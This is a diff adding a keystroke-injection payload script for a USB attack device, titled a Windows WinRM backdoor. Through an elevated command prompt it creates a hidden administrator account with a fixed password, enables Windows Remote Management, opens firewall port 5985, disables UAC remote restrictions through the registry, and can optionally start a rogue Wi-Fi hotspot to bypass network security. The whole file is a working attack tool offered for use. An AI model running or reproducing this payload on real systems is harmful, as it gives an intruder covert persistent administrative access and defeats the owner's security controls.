@@ -1,0 +1,142 @@
+#!/bin/bash
+#
+# Title:            "Microsoft Windows" WinRM Backdoor
+#
+# Description:      
+#                   1) Adds a user account.
+#                   2) Adds this local user to local administrator group.
+#                   3) If the target computer is equipped with a compatible Wi-Fi card :
+#                       Avoids security measures on the internal network with the 
+#                       creation of a wireless "Hosted Network".
+#                   4) Enables "Windows Remote Management" with default settings.
+#                   5) Adds a rule to the firewall.
+#                   6) Sets a value to "LocalAccountTokenFilterPolicy" to disable "UAC" remote restrictions.
+#                   7) Hides user account.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Microsoft Windows
+# Attackmode:       HID
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# REQUIREMENTS
+# ===============
+# The target user must belong to the 'Administrators' group.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Yellow quadruple blink .......................... STAGE4
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+
+######## INITIALIZATION ########
+
+readonly WINDOWS_USERNAME="BB_User"
+readonly WINDOWS_PASSWORD="BB_P@ssW0rD"
+
+##
+# (any) Administrators
+# (fr) Administrateurs
+##
+readonly GROUP_NAME="Administrators"
+
+##
+# Can be set to "true" if the target computer 
+# is equipped with a compatible Wi-Fi card.
+##
+readonly WIRELESS_HOTSPOT="false"
+readonly HOTSPOT_NAME="BB_HOTSPOT"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 2000
+Q GUI r
+Q DELAY 7000
+Q STRING "cmd"
+Q DELAY 1500
+Q CTRL-SHIFT ENTER
+Q DELAY 7000
+Q LEFTARROW
+Q DELAY 5000
+Q ENTER
+Q DELAY 7000
+
+LED STAGE2
+
+Q STRING "NET USER ${WINDOWS_USERNAME} ${WINDOWS_PASSWORD} /ADD"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "NET LOCALGROUP ${GROUP_NAME} ${WINDOWS_USERNAME} /ADD"
+Q ENTER
+Q DELAY 1500
+
+if [ "${WIRELESS_HOTSPOT}" == "true" ]
+then
+
+    LED SPECIAL
+
+    Q STRING "NETSH WLAN SET HOSTEDNETWORK MODE=ALLOW SSID=${HOTSPOT_NAME} KEY=${WINDOWS_PASSWORD}"
+    Q ENTER
+    Q DELAY 5000
+    
+    Q STRING "NETSH WLAN START HOSTEDNETWORK"
+    Q ENTER
+    Q DELAY 5000
+
+fi
+
+LED STAGE3
+
+Q STRING "WINRM QUICKCONFIG"
+Q ENTER
+Q DELAY 3000
+
+Q STRING "y"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "NETSH ADVFIREWALL FIREWALL ADD RULE NAME=\"Windows Remote Management for BB\" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE4
+
+Q STRING "REG ADD \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1"
+Q ENTER
+Q DELAY 1500
+
+Q STRING "REG ADD \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /f /v ${WINDOWS_USERNAME} /t REG_DWORD /d 0"
+Q ENTER
+Q DELAY 1500
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+Q STRING "EXIT"
+Q ENTER
+Q DELAY 1500
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
